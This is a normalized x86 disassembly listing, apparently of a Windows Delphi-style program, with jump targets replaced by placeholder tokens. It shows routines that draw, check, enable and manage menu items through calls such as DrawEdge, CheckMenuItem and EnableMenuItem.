mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449004
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cc90
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44bff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c790
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d1b8
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4492f4
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d530
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41cf88
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c4c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403224
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44bff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d457
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44b0b4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d390
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44bff0
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44d5a4
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44df88
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44d5d4
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44d620
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44d802
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403420
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44d5d4
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44df88
mov esi eax
mov eax edi
call sub_44d5a4
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404368
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c40
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403ff4
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44b0b4
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404268
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d809
lea eax [ ebp - 0x24 ]
call sub_403f5c
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44bff0
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44d834
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404368
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403fb0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44d85c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44d9cc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44d9dc
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44d8a4
sub_44d8a4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44bf60
push eax
call CheckMenuItem
mov eax esi
call sub_44d85c
sub_44d8f8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44d9cc
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44bf60
push eax
call EnableMenuItem
sub_44d970
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44dd30
mov edx eax
mov ecx ebx
mov eax edi
call sub_44bf00
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44d85c
sub_44d9dc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413918
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44b008
sub_44da4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44d9cc
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44da34
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44dd64
mov ecx ebx
mov edx esi
mov eax edi
call sub_44db58
sub_44da94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d9cc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d9dc
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44daec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44d9cc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44d9dc
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44d9dc
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44db58
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44b008
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44bf00
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413994
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44ddd0
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44d9cc
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44be30
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413918
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413918
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44d970
sub_44dc0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44b008
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44d9cc
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44be30
mov eax ebx
call sub_44d9cc
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413918
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413808
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44dc80
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44d8a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44d9b4
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44d9b4
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44dd48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d9cc
mov edx eax
mov ecx esi
mov eax ebx
call sub_44db58
pop esi
pop ebx
retn
sub_44dd64
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44dd30
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44dc0c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44b008
sub_44dd8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44ddd0
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44ddd0
jmp r-xdata
mov eax ebx
call sub_44be30
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44faa8
sub_44de28
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ ebx + 0x4c ] eax
sub_44de50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403224
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44e0e4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403420
mov edx ebx
mov eax edi
call sub_4194c0
mov eax ebx
mov si 0xffee
call sub_403420
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44dec0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fc28
mov [ esi + 0x4c ] eax
sub_44def4
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44d9cc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44d9dc
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44df34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44dd64
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44dd48
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44dd48
sub_44df98
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44d85c
sub_44dfc4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44d834
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44d8a4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44d8f8
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403fb0
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44da24
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44d970
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44da00
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44da14
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44e0e4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44d9b4
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403420
sub_44e108
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e128
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e148
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e168
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e188
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e1a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44e1c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
